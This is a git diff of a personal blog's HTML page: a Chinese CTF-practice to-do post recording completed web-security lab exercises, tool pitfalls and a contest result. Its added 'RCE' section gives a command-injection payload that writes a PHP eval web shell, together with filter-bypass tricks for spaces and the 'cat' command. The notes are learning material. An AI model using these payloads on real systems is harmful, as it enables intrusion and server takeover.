@@ -17,7 +17,7 @@
   <meta name="description" content="IceFeng的笔记本">
   <meta name="author" content="IceFeng">
   <meta name="keywords" content="icefeng,icefeng.cc,crack,Android,Web">
-  <title>每日Todo列表(2021/01/19) - IceFeng</title>
+  <title>Todo(2021/01/19-25) - IceFeng</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
 
@@ -29,7 +29,7 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/atelier-forest-light.min.css" />
     
   
 
@@ -162,7 +162,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="每日Todo列表(2021/01/19)">
+            <span class="h2" id="subtitle" title="Todo(2021/01/19-25)">
               
             </span>
 
@@ -184,7 +184,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      95 字
+      340 字
     </span>
   
 
@@ -194,7 +194,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      1
+      4
        分钟
     </span>
   
@@ -224,21 +224,50 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">每日Todo列表(2021/01/19)</h1>
+            <h1 style="display: none">Todo(2021/01/19-25)</h1>
             
             <div class="markdown-body">
               <h3 id="0x00-习惯的养成"><a class="header-anchor" href="#0x00-习惯的养成"></a>0x00 习惯的养成</h3>
 <blockquote>
 <p>早睡早起，锻炼身体，做TODO，让生活慢下来</p>
 <p>专注的去做几件事</p>
-<p>距离Ctf升降赛还有6天。</p>
+<p>距离Ctf升降赛还有0天。</p>
 </blockquote>
 <h3 id="0x01-今天的小目标"><a class="header-anchor" href="#0x01-今天的小目标"></a>0x01 今天的小目标</h3>
+<ol>
+<li>重要目标</li>
+</ol>
 <ul class="contains-task-list">
-<li class="task-list-item"><input class="task-list-item-checkbox" disabled="" type="checkbox"> 完成 Ctfhub 的信息泄露，密码口令 和 SQL注入</li>
-<li class="task-list-item"><input class="task-list-item-checkbox" disabled="" type="checkbox"> 完成 Upload-labs 的训练和总结 ⟹ 总结出一篇文件上传的常用技巧</li>
-<li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 信息泄露_Git+NU1L的SQL注入</li>
+<li class="task-list-item">
+<p><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 完成 Ctfhub 的信息泄露，密码口令 和 SQL注入</p>
+</li>
+<li class="task-list-item">
+<p><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 完成 Upload-labs 的训练和总结</p>
+</li>
+<li class="task-list-item">
+<p><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 信息泄露_Git+NU1L的SQL注入</p>
+</li>
+<li class="task-list-item">
+<p><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 完成 Sqli-labs 的训练和总结</p>
+</li>
+<li class="task-list-item">
+<p><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 选拔赛</p>
+</li>
 </ul>
+<h3 id="0x03-各种踩坑"><a class="header-anchor" href="#0x03-各种踩坑"></a>0x03 各种踩坑</h3>
+<ol>
+<li>kali有pyhton2和python3</li>
+<li>dirsearch因为作者的原因出bug 回退上个版本</li>
+<li>Githack 老版本不能获取.git文件夹，只针对.git存在的对象</li>
+<li>Git 暂存区的概念 git stash 保存暂存区和工作区的进度/ git stash pop 恢复最新的进度到工作区。</li>
+<li>git index是版本库</li>
+</ol>
+<h3 id="0X04-RCE远程执行"><a class="header-anchor" href="#0X04-RCE远程执行"></a>0X04 RCE远程执行</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">方法1：ls ../<br>方法2:127.0.0.1&amp;<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"&lt;?php @eval(\$_POST['ice']);?&gt;"</span> &gt; 111.php <br><span class="hljs-comment">#cat过滤</span><br>反斜杠 ： 例如  ca\t fl\ag.php<br>连接符： 例如   ca<span class="hljs-string">''</span>t fla<span class="hljs-string">''</span>g.txt<br><span class="hljs-comment">#空格过滤</span><br>&lt;,&lt;&gt;,%20(space),%09(tab),<span class="hljs-variable">$IFS</span><span class="hljs-variable">$9</span>, <span class="hljs-variable">$&#123;IFS&#125;</span>,<span class="hljs-variable">$IFS</span><br><span class="hljs-comment">#分隔符可以使用%0a代替</span><br>若直接使用文本框上传命令会导致字符被转义，直接访问URL<br></code></pre></td></tr></table></figure>
+<h3 id="0X05-短暂的结果"><a class="header-anchor" href="#0X05-短暂的结果"></a>0X05 短暂的结果</h3>
+<p>QAQ真刺激啊这比赛,第7就是我了。</p>
+<p>PS:😅好多原题没做出来，有种考研数学一的味道了，每天做点题，做题实在是太少了。</p>
+<p><img src="https://qaq233.oss-cn-hongkong.aliyuncs.com/POST/ctf/hbca_ctf_1.png" srcset="/img/loading.gif" alt=""></p>
 
             </div>
             <hr>
@@ -261,6 +290,12 @@
                 <div class="post-prevnext">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2021/01/19/http-base/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HTTP基础</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
